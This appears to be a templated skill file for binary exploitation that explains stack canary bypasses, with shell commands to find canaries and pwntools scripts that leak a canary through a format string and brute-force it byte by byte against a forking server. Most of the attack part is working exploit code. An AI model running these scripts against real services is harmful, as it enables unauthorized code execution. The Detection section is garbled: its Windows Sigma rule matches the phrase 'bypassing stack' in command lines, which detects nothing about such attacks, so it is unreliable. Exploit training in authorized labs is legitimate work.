---
name: bypassing-stack-canary-protection
description: <!-- Copyright (c) 2026 defconxt. All rights reserved. -->
---

<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->
---
name: bypassing-stack-canary-protection
description: >-
  Bypass stack canary (stack guard) protections through information leaks, brute force on forking servers, and canary-relative overwrites to achieve stack buffer overflow exploitation.
domain: cybersecurity
subdomain: binary-exploitation
tags:
  - stack-canary
  - canary-bypass
  - stack-guard
  - brute-force-canary
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1068"]
  cwe: ["CWE-693"]
  tools: ["pwntools", "GEF", "gdb"]
---

# Bypassing Stack Canary Protection

## Overview

Bypass stack canary (stack guard) protections through information leaks, brute force on forking servers, and canary-relative overwrites to achieve stack buffer overflow exploitation.

## Prerequisites

| Tool / Requirement | Details |
|---|---|
| `pwntools` | Security tooling |
| `GDB with GEF` | Security tooling |
| Target binary with identified vulnerability | Environment requirement |
| Isolated lab environment for testing | Environment requirement |
| Authorization and signed Rules of Engagement (RoE) | Environment requirement |

## Workflow

### Step 1: Identify Canary Presence

```bash
# Check for stack canary
checksec --file=./vuln

# Verify in disassembly (look for fs:0x28 on x86_64)
objdump -d ./vuln | grep -A2 "fs:0x28"

# GEF canary inspection
gef> canary
```

### Step 2: Leak Canary via Format String

```python
from pwn import *

context.binary = elf = ELF("./vuln")
p = process(elf.path)

# Leak canary via format string (offset varies)
p.sendline(b"%11$p")  # adjust offset for target
canary = int(p.recvline().strip(), 16)
log.success(f"Canary: {hex(canary)}")

# Verify: canary ends in \x00 on Linux
assert canary & 0xff == 0, "Invalid canary (should end in null byte)"
```

### Step 3: Brute Force Canary on Forking Server

```python
from pwn import *

context.binary = elf = ELF("./vuln")

def try_byte(known: bytes, guess: int) -> bool:
    p = remote("localhost", 1337)
    payload = b"A" * 72 + known + bytes([guess])
    p.send(payload)
    try:
        p.recv(timeout=1)
        p.close()
        return True
    except EOFError:
        p.close()
        return False

canary = b""
for i in range(8):
    for byte in range(256):
        if try_byte(canary, byte):
            canary += bytes([byte])
            log.info(f"Canary byte {i}: {hex(byte)}")
            break

log.success(f"Full canary: {hex(u64(canary))}")
```

## Detection

```yaml
title: Bypassing Stack Canary Protection Detection
id: cbca82d8-ce57-4bee-bc48-5e351d36c591
status: experimental
description: Detects suspicious activity related to bypassing stack canary protection techniques in binary exploitation context
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine: "*bypassing*stack*"
  condition: selection
level: critical
tags:
  - attack.t1068
  - attack.execution
falsepositives:
  - Vulnerability scanner testing known exploit signatures
```


**Detection Opportunities**

| Indicator | Source | Detection Logic |
|---|---|---|
| Bypassing Stack Canary Protection Detection | windows/process_creation | Sigma rule (critical) |
| ATT&CK Coverage | MITRE ATT&CK | T1068 |

## Verification

- [ ] Stack canary presence confirmed
- [ ] Canary value leaked or brute-forced
- [ ] Payload preserves canary in correct stack position
- [ ] Exploit achieves code execution with intact canary

## References

- [Stack Canaries](https://ir0nstone.gitbook.io/notes/types/stack/canaries)
- [GEF Canary](https://hugsy.github.io/gef/commands/canary/)
